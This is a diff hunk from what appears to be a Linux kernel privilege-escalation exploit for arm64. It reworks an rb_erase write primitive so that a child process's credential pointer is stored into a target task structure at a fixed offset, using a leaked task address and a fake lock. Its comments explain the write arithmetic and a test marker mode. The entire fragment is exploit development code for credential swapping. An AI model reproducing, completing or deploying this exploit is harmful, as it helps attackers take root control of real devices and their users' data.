@@ -446,16 +446,19 @@ void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex) {
           uintptr_t tgt_task = g_child_task;
           if (env_flag("MODE4_TARGET_WAITER", 0))
             tgt_task = jc2_self_task_leak();
+          /* TRUE ALGEBRA (rb_erase+0x7c: str x9,[x8], x8=left=TARGET,
+           * x9=pc=VALUE): *(left)=pc. pc=VALUE to deliver, left=TARGET.
+           * Parent-side change_child store lands inside the VALUE obj
+           * (+8 = gid/suid — increases, guard-safe). */
           if (env_flag("MODE4_CC_MARKER", 0)) {
-            uintptr_t mk = fake_lock + 0x800;
-            g_main_pc = mk | 1ULL;
-            g_main_left = 0x0BADF00D0BADF00DULL;
-            g_cc_parent = mk;
-            pr_info("JC2 CC MARKER: parent=%zx child=MARKER\nn", mk);
+            g_main_pc = 0x0BADF00D0BADF00DULL;
+            g_main_left = fake_lock + 0x808;
+            g_cc_parent = fake_lock + 0x800;
+            pr_info("JC2 CC MARKER: TARGET=page slot, VALUE=marker\nn");
           } else {
-          g_main_pc = ((uint64_t)(tgt_task + 0x778)) | 1ULL;
-          g_main_left = (uint64_t)g_child_cred;
-          g_cc_parent = (uintptr_t)(tgt_task + 0x778);
+            g_main_pc = (uint64_t)g_child_cred;
+            g_main_left = (uint64_t)(tgt_task + 0x780);
+            g_cc_parent = (uintptr_t)g_child_cred;
           }
           pr_info("JC2 CAPSONLY v2 CC: pc=%016llx (task+0x778|RED) "
                   "left=%016llx (VALUE=cred)\n",
